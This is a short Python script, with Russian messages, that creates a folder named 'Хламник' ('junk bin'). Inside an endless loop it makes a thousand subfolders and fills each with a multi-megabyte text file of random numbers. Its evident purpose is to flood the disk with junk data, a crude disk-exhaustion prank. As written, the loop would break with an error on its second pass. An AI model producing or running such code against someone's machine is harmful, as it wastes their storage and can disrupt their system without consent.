import os
import random


def text():
    string = ""
    i = 0
    while i < 1000000:
        string = string + str(random.randint(-100000, 100000))
        i += 1
    return string


def create_file():
    file = open("text.txt", "w")
    file.write(text())
    file.close()


print("Текущая деректория:", os.getcwd())

os.mkdir("Хламник")
os.chdir("Хламник")

while True:
    for i in range(1000):
        os.makedirs(f"Хламник{i}")

    for i in range(1000):
        os.chdir(f"Хламник{i}")
        create_file()
        os.chdir("..")
